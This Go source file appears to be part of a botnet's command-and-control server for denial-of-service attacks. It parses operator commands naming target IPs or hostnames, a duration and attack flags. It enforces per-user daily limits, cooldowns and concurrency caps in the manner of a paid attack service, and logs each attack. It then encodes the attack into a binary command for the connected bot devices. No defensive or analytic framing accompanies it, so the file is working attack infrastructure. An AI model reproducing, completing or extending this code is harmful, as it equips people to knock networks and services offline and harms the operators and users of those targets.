package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"reflect"
	"strconv"
	"strings"
	"time"
)

// IsMethod will confirm if the string is a method.
func IsMethod(method string) (*Method, bool) {
	for name, information := range Methods {
		if strings.EqualFold(strings.ToLower(name), strings.ToLower(method)) {
			return information, true
		}
	}

	return nil, false
}

type Attack struct {
	Targets 	map[uint32]uint8
	Duration    uint32
	Type 		uint8
	Flags	 	map[uint8]string
}

// Parse will parse the command into sendable bytes. 
func (M *Method) Parse(args []string, user *User) (*Attack, error) {
	var profile *Attack = &Attack{
		Targets: make(map[uint32]uint8),
		Flags: make(map[uint8]string),
	}

	if len(args) < 2 { // Missing target
		return new(Attack), errors.New("you must provide a target")
	} else if !Attacks { // Disabled attacks?
		return new(Attack), errors.New("attacks are currently disabled")
	}

	// Fetches all the attacks sent within the day. only non-admin users will be alerted.
	sent, err := UserOngoingAttacks(user.Username, time.Date(time.Now().Year(), time.Now().Month(), time.Now().Day(), 0, 0, 0, 0, time.Now().Location()))
	if err != nil || len(sent) >= user.MaxDaily && !user.Admin {
		return nil, errors.New("your daily attack limit exceeded of " + strconv.Itoa(len(sent)))
	}

	running, err := OngoingAttacks(time.Now())
	if err != nil || len(running) >= Options.Templates.Attacks.MaximumOngoing {
		return new(Attack), errors.New("maximum global attack limit exceeded")
	}

	thererunning, err := UserOngoingAttacks(user.Username, time.Now())
	if err != nil || thererunning == nil {
		return new(Attack), errors.New("unknown issue when fetching details")
	}

	// Checks within the thererunning limits
	if len(thererunning) > 0 {
		if user.Conns > 0 && user.Conns < len(thererunning) {
			return new(Attack), errors.New("concurrent limit exceeded")
		}

		var recent *AttackLog = &thererunning[0]
		for _, attack := range thererunning {
			if attack.Sent > recent.Sent {
				recent = &attack; continue
			}
		}

		if user.Cooldown > 0 && recent.Sent + int64(user.Cooldown) > time.Now().Unix() {
			return new(Attack), errors.New("you are in cooldown")
		}
	}
	
	var ips []string = make([]string, 0)

	// Parses all the possible targets
	for pos, target := range strings.Split(args[1], ",") {
		if pos > 255 {
			return new(Attack), errors.New("too many targets")
		}

		types, ok := CanAttack(target) 
		if !ok {
			return new(Attack), errors.New("unknown target")
		}

		
		switch types {
		case 1: // IP resolve
			p := net.ParseIP(target)
			if p == nil {
				return new(Attack), errors.New("invalid target")
			}

			profile.Targets[binary.BigEndian.Uint32(p[12:])] = 32
			ips = append(ips, target)
		case 2, 3: // Target resolve
			endpoints, err := resolver.LookupHost(target)
			if err != nil {
				return new(Attack), errors.New("invalid target")
			}

			// Ranges through the dns endpoints
			for _, endpoint := range endpoints {
				if endpoint == nil {
					continue
				}

				profile.Targets[binary.BigEndian.Uint32(endpoint.To16()[12:])] = 32
				ips = append(ips, endpoint.String())
			}
		}
	}

	args[1] = strings.Join(ips, ",")
	if len(args) < 3 { // Missing duration
		return new(Attack), errors.New("you must provide a duration")
	}


	var appends []string = make([]string, 0)
	if len(args) >= 4 { // Checks if there is attack flags.
		for _, flag := range args[3:] {
			flagSplit := strings.Split(flag, "=")
			if len(flagSplit) < 2 {
				return new(Attack), errors.New("invalid combination key=value")
			}

			information, ok := Flags[flagSplit[0]]
			if !ok || !InUint8Slice(M.Flags, information.ID) {
				return new(Attack), errors.New("unknown flag combination")
			}


			value := strings.Join(flagSplit[1:], "=")
			appends = append(appends, flagSplit[0] + "=" + value)
			switch value {
			case "true", "t", "yes": // Boolean
				value = "1"
			case "false", "f", "no": // Boolean
				value = "0"
			}

			profile.Flags[uint8(information.ID)] = value
		}
	}

	// Ranges through allt he system flags
	for value, system := range Flags {
		if !InUint8Slice(M.Flags, system.ID) || InStringSlice(appends, value, "=") || !system.HasDefault {
			continue
		}

		switch system.Type {
		case reflect.String: // String
			if len(fmt.Sprint(system.Default)) > system.Maximum || len(fmt.Sprint(system.Default)) < system.Minimum {
				return new(Attack), errors.New("not within min/max bounds")
			}

			profile.Flags[uint8(system.ID)] = fmt.Sprint(system.Default)

		case reflect.Int: // Int
			convert, err := strconv.Atoi(fmt.Sprint(system.Default))
			if err != nil {
				return new(Attack), errors.New("error with flag configs")
			} else if convert > system.Maximum || convert < system.Minimum {
				return new(Attack), errors.New("not within min/max bounds")
			}

			profile.Flags[uint8(system.ID)] = fmt.Sprint(convert)
			
		case reflect.Bool: // Bool
			convert, err := strconv.ParseBool(fmt.Sprint(system.Default))
			if err != nil {
				return new(Attack), errors.New("error with flag configs")
			}

			profile.Flags[uint8(system.ID)] = fmt.Sprint(convert)
		}
	}

	duration, err := strconv.Atoi(args[2])
	if err != nil {
		return new(Attack), errors.New("invalid duration")
	}

	if duration > user.Maxtime {
		return new(Attack), errors.New("duration must be greater than user.maxtime")
	}
	
	profile.Duration = uint32(duration)
	return profile, LogAttack(&AttackLog{Target: args[1], Duration: duration, Flags: strings.Join(appends, " "), Sent: time.Now().Unix(), Finish: time.Now().Add(time.Duration(duration) * time.Second).Unix(), User: user.Username, Devices: len(Clients)})
}

// Bytes will effectively build the entire attack command.
func (A *Attack) Bytes() ([]byte, error) {
	var buf []byte = make([]byte, 0)

	// Apply the duration inside the attack
	var duration []byte = make([]byte, 4)
	binary.BigEndian.PutUint32(duration, A.Duration)
	buf = append(buf, duration...)

	// Apply the attack type
	buf = append(buf, byte(A.Type))

	// Adds the amount of number targets
	buf = append(buf, byte(len(A.Targets)))
	for prefix, netmask := range A.Targets {
		target := make([]byte, 5)
		binary.BigEndian.PutUint32(target, prefix)
		target[4] = byte(netmask)

		buf = append(buf, target...)
	}

	buf = append(buf, byte(len(A.Flags)))
	for key, value := range A.Flags {
		flag := make([]byte, 2)
		flag[0] = key
		
		stringBuf := []byte(value)
		if len(stringBuf) > 255 {
			return nil, errors.New("no more than 255 bytes")
		}

		flag[1] = uint8(len(stringBuf))
		flag = append(flag, stringBuf...)
		buf = append(buf, flag...)
	}

	if len(buf) > 1024 && len(buf) <= 0 {
		return nil, errors.New("invalid buf length reached")
	}

	final := make([]byte, 2)
	binary.BigEndian.PutUint16(final, uint16(len(buf) + 2))
	buf = append(final, buf...)
	return buf, nil
}

// InSlice checks if a is inside s
func InUint8Slice(s []uint8, a uint8) bool {
	for _, i := range s {
		if i == a {
			return true
		}
	}

	return false
}

// InSlice checks if a is inside s
func InStringSlice(s []string, a, split string) bool {
	for _, i := range s {
		if strings.Split(i, split)[0] == strings.Split(a, split)[0] {
			return true
		}
	}

	return false
}